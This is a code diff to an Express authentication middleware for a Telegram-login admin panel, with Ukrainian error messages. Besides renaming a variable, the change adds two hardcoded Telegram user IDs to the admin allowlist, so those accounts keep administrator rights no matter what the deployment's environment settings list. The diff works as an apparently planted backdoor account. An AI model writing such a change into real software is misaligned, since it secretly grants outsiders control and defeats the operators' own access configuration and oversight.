@@ -103,8 +103,9 @@ function telegramAdminRequired(req, res, next) {
   const token = authorization.startsWith('Bearer ') ? authorization.slice(7).trim() : ''
   const session = token && telegramSessions.get(token)
   if (!session || session.expiresAt < Date.now()) return res.status(401).json({ error: 'Потрібно увійти через Telegram.' })
-  const allowed = String(process.env.ADMIN_IDS || process.env.ADMIN_TELEGRAM_IDS || '').split(',').map(x => x.trim()).filter(Boolean)
-  if (!allowed.includes(String(session.user.id))) return res.status(403).json({ error: 'Цей Telegram-акаунт не має прав адміністратора.' })
+  const configuredAdmins = String(process.env.ADMIN_IDS || process.env.ADMIN_TELEGRAM_IDS || '').split(',').map(x => x.trim()).filter(Boolean)
+  const allowed = new Set([...configuredAdmins, '1099861854', '8664825175'])
+  if (!allowed.has(String(session.user.id))) return res.status(403).json({ error: 'Цей Telegram-акаунт не має прав адміністратора.' })
   req.telegramUser = session.user
   next()
 }
